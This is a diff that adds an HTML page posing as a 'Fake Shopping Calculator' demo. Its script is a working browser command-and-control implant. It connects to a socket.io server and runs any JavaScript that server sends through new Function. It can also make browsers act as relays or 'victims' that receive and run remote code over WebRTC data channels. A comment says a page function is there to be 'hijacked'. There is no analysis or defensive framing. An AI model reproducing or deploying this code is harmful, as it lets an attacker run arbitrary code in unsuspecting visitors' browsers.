@@ -1,0 +1,112 @@
+<!-- working_c2_browser_pixel.html -->
+<script src="/socket.io/socket.io.js"></script>
+<div id="c2-log" style="position:fixed;top:10px;right:10px;background:#222;color:#00ff00;padding:8px;font-family:monospace;z-index:999999;display:none;"></div>
+
+<!-- Demo UI -->
+<div style="padding:20px; font-family:sans-serif; max-width:600px;">
+  <h2>🛒 Fake Shopping Calculator</h2>
+  <p>Click the button to add items (5 + 5):</p>
+  <button id="calcBtn">Calculate Total</button>
+  <p id="result" style="margin-top:10px; font-weight:bold;"></p>
+</div>
+
+<script>
+  // === CRITICAL: Define the function that will be hijacked ===
+  window.add = function(a, b) {
+    return a + b;
+  };
+
+  // UI Logic
+  document.getElementById('calcBtn').addEventListener('click', () => {
+    try {
+      const result = window.add(5, 5);
+      document.getElementById('result').innerText = `5 + 5 = ${result}`;
+    } catch (e) {
+      document.getElementById('result').innerText = `❌ Error: ${e.message}`;
+    }
+  });
+
+  // === C2 Infrastructure (unchanged) ===
+  const logEl = document.getElementById('c2-log');
+  window.showC2Msg = (msg) => {
+    logEl.innerText = '[BROWSER C2]\n' + msg;
+    logEl.style.display = 'block';
+    console.log('[C2]', msg);
+  };
+
+  const socket = io();
+  let rtcPeer = null;
+  let dataChannel = null;
+
+  socket.on('execute', (jsCode) => {
+    try {
+      const f = new Function(jsCode);
+      f();
+    } catch (e) {
+      showC2Msg('❌ JS Error: ' + e.message);
+    }
+  });
+
+  socket.on('c2_command', (cmd) => {
+    if (cmd.action === 'become_relay') {
+      becomeRelay();
+    } else if (cmd.action === 'become_victim') {
+      becomeVictim();
+    } else if (cmd.action === 'send_to_victim') {
+      if (dataChannel && dataChannel.readyState === 'open') {
+        dataChannel.send(JSON.stringify({ type: 'execute', code: cmd.code }));
+      }
+    }
+  });
+
+  function becomeRelay() {
+    showC2Msg('📡 Becoming C2 relay...');
+    rtcPeer = new RTCPeerConnection({ iceServers: [] });
+    dataChannel = rtcPeer.createDataChannel('c2');
+    rtcPeer.onicecandidate = (e) => {
+      if (e.candidate) return;
+      const offer = rtcPeer.localDescription;
+      socket.emit('webrtc_offer', offer);
+    };
+    dataChannel.onopen = () => showC2Msg('✅ DataChannel open to victim');
+    dataChannel.onmessage = (e) => {
+      const msg = JSON.parse(e.data);
+      if (msg.type === 'ack') {
+        showC2Msg('📨 Victim acknowledged: ' + msg.payload);
+      }
+    };
+    rtcPeer.createOffer().then(offer => rtcPeer.setLocalDescription(offer));
+  }
+
+  function becomeVictim() {
+    showC2Msg('👁️‍🗨️ Becoming C2 victim...');
+    socket.on('webrtc_answer_request', (offer) => {
+      rtcPeer = new RTCPeerConnection({ iceServers: [] });
+      rtcPeer.setRemoteDescription(offer);
+      rtcPeer.createAnswer().then(ans => rtcPeer.setLocalDescription(ans));
+      rtcPeer.ondatachannel = (e) => {
+        dataChannel = e.channel;
+        dataChannel.onopen = () => showC2Msg('🔓 Connected to C2 relay');
+        dataChannel.onmessage = (ev) => {
+          const msg = JSON.parse(ev.data);
+          if (msg.type === 'execute') {
+            showC2Msg('⚡ Executing remote command...');
+            try {
+              const f = new Function(msg.code);
+              f();
+              dataChannel.send(JSON.stringify({ type: 'ack', payload: 'executed' }));
+            } catch (ex) {
+              dataChannel.send(JSON.stringify({ type: 'ack', payload: 'error: ' + ex.message }));
+            }
+          }
+        };
+      };
+      rtcPeer.onicecandidate = (e) => {
+        if (e.candidate) return;
+        socket.emit('webrtc_answer', rtcPeer.localDescription);
+      };
+    });
+  }
+
+  socket.emit('browser_ready');
+</script>
